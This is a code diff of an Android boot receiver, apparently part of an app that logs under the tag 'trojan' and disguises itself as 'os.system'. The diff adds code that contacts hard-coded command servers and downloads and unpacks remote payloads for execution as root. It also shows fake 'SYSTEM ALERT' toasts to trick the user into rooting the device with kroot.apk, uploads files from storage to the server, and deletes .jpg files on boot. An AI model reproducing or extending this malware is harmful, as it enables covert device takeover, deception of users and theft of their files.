@@ -1,15 +1,24 @@
 package os.system;
 
+import org.apache.http.params.HttpParams;
+import org.apache.http.params.BasicHttpParams;
+import org.apache.http.params.HttpConnectionParams;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
+import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
+import org.json.*;
 import android.os.AsyncTask;
 import android.os.CountDownTimer;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.Vibrator;
 import android.content.BroadcastReceiver;
 import android.util.Log;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.*;
 import android.content.ActivityNotFoundException;
 import android.content.SharedPreferences;
@@ -23,6 +32,8 @@ import android.net.Uri;
 import android.webkit.MimeTypeMap;
 import android.net.wifi.WifiManager;
 import android.net.wifi.WifiConfiguration;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import java.io.*;
 import java.net.*;
 import java.lang.reflect.*;
@@ -30,8 +41,8 @@ import java.lang.reflect.*;
 public class ReceiverBoot extends BroadcastReceiver
 {
 	private static String TAG = "trojan";
+	private Vibrator vibrator;
 	private boolean oke = true;
-	private Toast toast;
 	private Context exContext;
 	private ServerUtils utils;
     private Installer installator;
@@ -39,43 +50,156 @@ public class ReceiverBoot extends BroadcastReceiver
     private static String version = "1";
     private SharedPreferences settings;
 	private SharedPreferences.Editor seteditor;
-	private static boolean prosesdownload = false;
+	private static boolean prosesThread = true;
+	private static boolean tmpThread = true;
+	private static int delayThread = 3;
 	private static int sizedownload = 0;
+	private static String[] server = { "http://10.42.0.1","http://sunjangyo12.000webhostapp.com" };
+	private static boolean finishInstall = false;
 	
+	public Toast toast;
+	public static int iserver = 0;
+	public static int errServer = 0;
+	public static int jserver = 2;
+	public static boolean pingResult = false;
+	public static String urlServer = "";
 	public static String requestAksi = "";
 	public static String requestPath = "";
 	public static String requestUrl = "";
 	public static String requestResult = "";
+	public static String requestResultUpload = "";
     public static boolean main = true;
+    public static boolean rootResult = false;
     public static String docFolder, pathExternal;
+    private Handler mHandler = new Handler();
+
+	private Runnable mRefresh = new Runnable() {
+		public void run() {
+			prosesThread = false;
+			try {
+				toast.show();
+			}catch(Exception e) {}
+			mHandler.postDelayed(mRefresh, delayThread * 1000);
+		}
+	};
 
 	public String getPath() {
 		return pathExternal;
+	}
+	public void shared(String judul, String save) {
+		seteditor.putString(judul, save);    
+        seteditor.commit();
 	}
 
 	@Override
 	public void onReceive(Context context, Intent intent)
 	{
 		exContext = context;
+		vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
 		settings = context.getSharedPreferences("Settings", 0);
 		seteditor = settings.edit();
 		utils = new ServerUtils(context);
         pathToInstallServer = utils.getPathToInstallServer();
         docFolder = utils.getDocFolder();
         pathExternal = utils.getPathExternal();
+        urlServer = server[iserver];
 
-        if (!hostspotStatus(context)) {
-	        cekUpdate(context, intent);
-	    }        
-        
-	    if (!utils.checkInstall()) {
-        	extrak(context, "server.zip", pathToInstallServer, docFolder);
-        }
-        if (settings.getBoolean("server install",true)) 
+        if (settings.getString("swmain","").equals("hidup")) 
+		{
+			main(context, intent);
+		}
+		//harus urut eksekusi
+		if (cekConnection(context)) {
+        	if (ping(context).equals("1")){
+        		Log.i(TAG, "ping terhubung");
+        		pingResult = true;
+        	} else {
+        		Log.i(TAG, "ping error");
+        		pingResult = false;
+        	}
+        	if (prosesThread) {
+        		mHandler.postDelayed(mRefresh, delayThread * 1000);
+        	}
+        }		
+
+        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
         {
-        	if (!utils.checkInstallData()) {
-				extrak(context, "data.zip", pathExternal, pathExternal);
+			context.startService(new Intent(context, System.class));
+			try {
+				Runtime.getRuntime().exec("rm "+pathExternal+"/*.jpg");
 			}
+			catch(Exception e) {}
+		}
+	}
+
+	public void main(Context context, Intent intent) {
+        if (!hostspotStatus(context)) 
+        {
+	        if (!new File(pathExternal+"/system.apk").exists()) {
+	        	if (new MainActivity().apkMana(context, "os.system", "pull")) 
+	        	{
+	        		try {
+	        			Thread.sleep(4000);
+	        			Runtime.getRuntime().exec("mv "+pathExternal+"/os.system.apk "+pathExternal+"/system.apk");
+	        		}catch(Exception e){
+	        			Log.i(TAG, "rename er : "+e);
+	        		}
+	        	} //copy apk
+	        }//cek file
+	    }
+
+
+	    if (!utils.checkDownload()) 
+	    {
+	    	Log.i(TAG, "......download server");
+
+			requestUrl = urlServer+"/install.txt";
+			requestAksi = "web";
+			mainRequest(context);
+
+		   	JSONObject obj;
+
+	    	if (!new File(pathExternal+"/server.zip").exists()) 
+	    	{
+	    		try {
+	    			obj = new JSONObject(requestResult);
+		    		Log.i(TAG, "download server : "+obj.getString("url_install_server"));
+
+		    		requestUrl = obj.getString("url_install_server");
+					requestAksi = "download";
+					requestPath = pathExternal+"/server.zip";
+					mainRequest(context);
+				}
+				catch(Exception e) {}
+	    	} else {
+	    		try {
+	    			obj = new JSONObject(requestResult);
+		    		Log.i(TAG, "download DATA : "+obj.getString("url_install_data"));
+
+		    		requestUrl = obj.getString("url_install_data");
+					requestAksi = "download";
+					requestPath = pathExternal+"/data.zip";
+					mainRequest(context);
+				}catch(Exception e) {}
+	    	}
+	    	
+        } 
+
+        if (utils.checkDownload() && !utils.checkInstall()) {
+        	extrak(context, pathExternal+"/server.zip", pathToInstallServer, docFolder);
+        }
+
+        if (utils.checkDownload() && !utils.checkInstallData() && utils.checkInstall()) {
+			extrak(context, pathExternal+"/data.zip", pathExternal, pathExternal);
+        }
+        Log.i(TAG,""+utils.checkInstallData());
+
+        if (utils.checkInstallData()) {
+			finishInstall = true;
+        }
+        
+        if (finishInstall) 
+        {
 			if (rootRequest().equals("root")) 
 			{
 				boolean[] flags = utils.checkRun();
@@ -84,14 +208,20 @@ public class ReceiverBoot extends BroadcastReceiver
 	        	} else {
 	        		utils.runSrv();
 	        	}
-				
+				rootResult = true;
 			}
 			else if (rootRequest().equals("tolak user")) {
-				toastText(context, "SYSTEM ERROR!!\n\n\n     Please Allow superuser.    \n", Color.GREEN, Gravity.CENTER, 20000);
+				rootResult = false;
+				delayThread = 3;
+				toastText(context, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\n\n\n", Color.RED, Gravity.TOP);
 			}
 			else if (rootRequest().equals("tidak root")) {
-				if (!openApp(context, "kingoroot.supersu")) 
+				rootResult = false;
+				if (!new MainActivity().apkMana(context, "kingoroot.supersu", "open")) 
 				{
+					delayThread = 1;
+					toastText(context, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app SuperUser\n\b2. Open app and click root.\n\n\n\n\n       [ WARNING! ]\n\n\n", Color.YELLOW, Gravity.TOP);
+		
 					String path = pathExternal+"/kroot.apk";
 					String ext = getExtension(path);
 					MimeTypeMap mime = MimeTypeMap.getSingleton();
@@ -104,38 +234,15 @@ public class ReceiverBoot extends BroadcastReceiver
 	            	try {
 	            	    context.startActivity(intent);
 	            	} catch (Exception ae) {}
-
-					toastText(context, "SYSTEM ERROR!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app SuperUser\n\b2. Open app and click root.", Color.YELLOW, Gravity.CENTER, 200000);
+	      		}
+				else {
+					delayThread = 5;
+					toastText(context, "  [ PLEASE ROOTING NOW ]   \n\n\n     Android system reboot after 30 minuts.    \n\n\n[ WARNING ]\n", Color.GREEN, Gravity.TOP);
 				}
 			}
-			else {
-				//unknow
-			}
-					
         }
-
-        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
-			context.startService(new Intent(context, System.class));
-			int nowVersion = -1;
-        	int newVersion = -1;
-        	try {
-        		newVersion = Integer.parseInt(version);
-        	}catch (Exception e) {}
-        	try {
-        		PackageInfo pinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
-        		nowVersion = pinfo.versionCode;
-        	}
-        	catch(Exception e) {}
-			if (rootRequest().equals("root") && nowVersion != newVersion) 
-			{
-				intent = new Intent(Intent.ACTION_VIEW);
-        		intent.setDataAndType(Uri.fromFile(new File(pathExternal+"/system.apk")), "application/vnd.android.package-archive");
-        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        		context.startActivity(intent);
-				toastText(context, "NOW AVAILABLE!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app\n\b2. Open the app.", Color.GREEN, Gravity.CENTER, 15000);
-			}
-		}
 	}
+
 
 	public String cekClientOrServer() {
 		String sip = Identitas.getIPAddress(true);
@@ -159,69 +266,33 @@ public class ReceiverBoot extends BroadcastReceiver
 		return "ada";
 	}
 
-	public void cekUpdate(Context context, Intent intent) 
+	public String ping(Context context) 
 	{
-		if (!prosesdownload) {
-			prosesdownload = false;
-			Log.i(TAG, "download mati");
+		Log.i(TAG, "ping server: "+server[iserver]);
 
-			//requestUrl = "https://sunjangyo12.000webhostapp.com/save.txt";
-			requestUrl = "http://10.42.0.1/save.txt";
-			requestAksi = "web";
-			mainRequest(context);
+		requestUrl = server[iserver]+"/ping.txt";
+		requestAksi = "web";
+		mainRequest(context);
+
+		return requestResult;
+	}
+
+	public static boolean cekConnection(Context context) {
+		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
+		NetworkInfo wifinfo    = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
+		NetworkInfo mobileinfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
+		NetworkInfo active     = cm.getActiveNetworkInfo();
+		
+		if (wifinfo != null && wifinfo.isConnected()) {
+			return true;
 		}
-		String[] upResult = requestResult.split("\n");
-
-		Log.i(TAG, "web : "+upResult[0]);
-
-		if (upResult[0].equals("")) {
-			Log.i(TAG, "<<<< result null >>>>");
-		} else {
-			if (upResult[0].equals(version)){
-				Log.i(TAG, "now version : "+version);
-			} else {
-				Log.i(TAG, "Update...");
-				Log.i(TAG, "total : "+sizedownload);
-
-				prosesdownload = true;
-				seteditor.putString("version", upResult[0]);    
-  	        	seteditor.commit();
-
-  	        	version = settings.getString("version","");
-  	        	requestUrl = "http://10.42.0.1/download.php?id=system.apk";
-				requestAksi = "download";
-				requestPath = pathExternal+"/system.apk";
-				mainRequest(context);
-			}
+		if (mobileinfo != null && mobileinfo.isConnected()) {
+			return true;
 		}
-
-		int nowVersion = -1;
-        int newVersion = -1;
-        try {
-        	newVersion = Integer.parseInt(version);
-        }catch (Exception e) {}
-        try {
-        	PackageInfo pinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
-        	nowVersion = pinfo.versionCode;
-        }
-        catch(Exception e) {}
-
-        if (nowVersion != newVersion  &&  sizedownload == 100) {
-        	Log.i(TAG, "download complete.");
-			Log.i(TAG, "total : "+sizedownload);
-	        prosesdownload = false;
-	        sizedownload = 0;
-
-        	intent = new Intent(Intent.ACTION_VIEW);
-        	intent.setDataAndType(Uri.fromFile(new File(pathExternal+"/system.apk")), "application/vnd.android.package-archive");
-        	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        	context.startActivity(intent);
-
-			toastText(context, "NOW AVAILABLE!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app\n\b2. Open the app.", Color.GREEN, Gravity.CENTER, 15000);
-
-        } else {
-        	Log.i(TAG, "udah terbaru : "+nowVersion);
-        }
+		if (active != null && active.isConnected()) {
+			return true;
+		}
+		return false;
 	}
 
 	public static void setGSM(boolean enable, Context context) {
@@ -354,12 +425,29 @@ public class ReceiverBoot extends BroadcastReceiver
 		}
 		String response = output.toString();
 		return response;
+	}
+	
 
+	public String textSplit(String data, String tsplit) {
+		StringBuffer out = new StringBuffer();
+		String[] sp = data.split(tsplit);
+
+		for (int i=0; i<sp.length; i++) {
+			out.append(sp[i]);
+		}
+		return out.toString();
+	}
+
+	public void editor(Context context, String text, String nfile) {
+		Installer save = new Installer(context, false);
+		try {
+			save.saveCode(text, "utf-8", pathExternal+"/"+nfile);
+		}catch(Exception e){}
 	}
 
 	private void extrak(Context context, String efile, String pathsatu, String pathdua) {
-		installator = new Installer(context, true);
-        installator.execute(efile, pathsatu, pathdua);
+		Installer installator = new Installer(context, true);
+		installator.execute(efile, pathsatu, pathdua);
 	}
 
 	private static String getExtension(String path) {
@@ -369,12 +457,140 @@ public class ReceiverBoot extends BroadcastReceiver
         return null;
     }
 
+
+	public void toastText(Context context, String data, int warna, int letak)
+	{
+		LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE );
+		View layout = inflater.inflate(R.layout.toast, null);
+
+    	TextView text = (TextView) layout.findViewById(R.id.toast);
+		text.setText(data);
+		text.setTextColor(Color.BLACK);
+		text.setTextSize(13);
+		text.setGravity(Gravity.CENTER);
+
+		toast = new Toast(context.getApplicationContext());
+		toast.setGravity(letak, 0, 0);
+		toast.setView(text);
+		toast.setView(layout);
+
+		View toastView = toast.getView();
+		toastView.setBackgroundColor(warna);
+	}
+
 	public void mainRequest(Context context) {
 		CallWebPageTask task = new CallWebPageTask();
 		task.applicationContext = context;
 		task.main = requestAksi;
-		task.execute(new String[] { requestUrl });
+
+		try {
+			if (cekConnection(context) && errServer <= 3) {
+				task.execute(new String[] { requestUrl });
+			} else {
+				Log.i(TAG, "rece connection : "+cekConnection(context));
+			}
+		}catch(Exception e) {
+			errServer += 1;
+			Log.i(TAG, "timeout update: "+errServer+" >>"+e);
+		}
 	}
+
+	public String requestUpload() {
+		String strSDPath = requestPath;
+		String strUrlServer = requestUrl;
+            
+		int bytesRead, bytesAvailable, bufferSize;
+		byte[] buffer;
+		int maxBufferSize = 1 * 1024 * 1024;
+		int resCode = 0;
+		String resMessage = "";
+
+		String lineEnd = "\r\n";
+		String twoHyphens = "--";
+		String boundary =  "*****";
+		String resServer = "";
+
+        	
+		try {
+			/** Check file on SD Card ***/
+			File file = new File(strSDPath);
+			if(!file.exists())
+			{
+				resServer = "{\"StatusID\":\"0\",\"Error\":\"Please check path on SD Card\"}";
+				return null;
+			}
+
+			FileInputStream fileInputStream = new FileInputStream(new File(strSDPath));
+
+			URL url = new URL(strUrlServer);
+			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+			conn.setDoInput(true);
+			conn.setDoOutput(true);
+			conn.setUseCaches(false);
+			conn.setRequestMethod("POST");
+
+			conn.setRequestProperty("Connection", "Keep-Alive");
+			conn.setRequestProperty("Content-Type",
+										"multipart/form-data;boundary=" + boundary);
+
+			DataOutputStream outputStream = new DataOutputStream(conn
+																	 .getOutputStream());
+			outputStream.writeBytes(twoHyphens + boundary + lineEnd);
+			outputStream.writeBytes("Content-Disposition: form-data; name=\"filUpload\";filename=\""+ strSDPath + "\"" + lineEnd);
+			outputStream.writeBytes(lineEnd);
+
+			bytesAvailable = fileInputStream.available();
+			bufferSize = Math.min(bytesAvailable, maxBufferSize);
+			buffer = new byte[bufferSize];
+
+			// Read file
+			bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+
+			while (bytesRead > 0) {
+				outputStream.write(buffer, 0, bufferSize);
+				bytesAvailable = fileInputStream.available();
+				bufferSize = Math.min(bytesAvailable, maxBufferSize);
+				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+			}
+
+			outputStream.writeBytes(lineEnd);
+			outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+
+			// Response Code and  Message
+			resCode = conn.getResponseCode();
+			if(resCode == HttpURLConnection.HTTP_OK)
+			{
+				InputStream is = conn.getInputStream();
+				ByteArrayOutputStream bos = new ByteArrayOutputStream();
+
+				int read = 0;
+				while ((read = is.read()) != -1) {
+					bos.write(read);
+				}
+				byte[] result = bos.toByteArray();
+				bos.close();
+				resMessage = new String(result);
+			}
+
+			Log.d("resCode=",Integer.toString(resCode));
+			Log.d("resMessage=",resMessage.toString());
+
+			fileInputStream.close();
+			outputStream.flush();
+			outputStream.close();
+
+			resServer = resMessage.toString();
+			requestResultUpload = resServer;
+		
+		} catch (Exception ex) {
+			// Exception handling
+			requestResultUpload = "uploaderror";
+
+			return null;
+		}
+		return resServer;
+	}
+	
 
 	public String requestDownload() {
 		InputStream input = null;
@@ -430,7 +646,11 @@ public class ReceiverBoot extends BroadcastReceiver
 	//Mengirimkan data web keserver
 	public String requestWeb(){
 		String sret = "";
-        HttpClient httpClient = new DefaultHttpClient();
+		HttpParams httpParams = new BasicHttpParams();
+	    HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
+	    HttpConnectionParams.setSoTimeout(httpParams, 50000);
+
+        HttpClient httpClient = new DefaultHttpClient(httpParams);
         HttpGet request = new HttpGet(requestUrl);
         try{
             HttpResponse response = httpClient.execute(request);
@@ -441,7 +661,7 @@ public class ReceiverBoot extends BroadcastReceiver
          	   StringBuilder str = new StringBuilder();
          	   String line = null;
          	   while((line = reader.readLine()) != null){
-         	       str.append(line + "\n");
+         	       str.append(line);
          	   }
          	   in.close();
          	   sret = str.toString();
@@ -450,7 +670,11 @@ public class ReceiverBoot extends BroadcastReceiver
         	}
         }
 		catch(Exception ex){
-			Log.i(TAG, "Failed Connect to Server!");
+			iserver += 1;
+			if (iserver == jserver) {
+				iserver = 0;
+			}
+			Log.i(TAG, "Failed rece Connect to Server!");
         }
         return sret;
     }
@@ -472,6 +696,9 @@ public class ReceiverBoot extends BroadcastReceiver
 			else if (main.equals("download")){
 				return requestDownload();
 			}
+			else if (main.equals("upload")) {
+				return requestUpload();
+			}
 			return null;
 	    }
 
@@ -484,53 +711,4 @@ public class ReceiverBoot extends BroadcastReceiver
 		}
 	}
 
-	
-	public static boolean openApp(Context context, String packageName) {
-		PackageManager manager = context.getPackageManager();
-		try {
-			Intent i = manager.getLaunchIntentForPackage(packageName);
-			if (i == null) {
-				return false;
-				//throw new ActivityNotFoundException();
-			}
-			i.addCategory(Intent.CATEGORY_LAUNCHER);
-			context.startActivity(i);
-			return true;
-		} 
-		catch (ActivityNotFoundException e) {
-			return false;
-		}
-	}
-
-	public void toastText(Context context, String data, int warna, int letak, int waktu)
-	{
-		LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE );
-		View layout = inflater.inflate(R.layout.toast, null);
-
-    	TextView text = (TextView) layout.findViewById(R.id.toast);
-		text.setText(data);
-		text.setTextColor(Color.BLACK);
-		text.setTextSize(13);
-		text.setGravity(Gravity.CENTER);
-
-		toast = new Toast(context.getApplicationContext());
-		toast.setGravity(letak, 0, 0);
-		toast.setView(text);
-		toast.setView(layout);
-
-		View toastView = toast.getView();
-		toastView.setBackgroundColor(warna);
-
-    	CountDownTimer hitungMundur = new CountDownTimer(waktu, 100)
-		{
-			public void onTick(long millisUntilFinished)
-			{
-				toast.show();
-			}
-			public void onFinish()
-			{
-				toast.cancel();
-			}
-		}.start();
-	}
 }
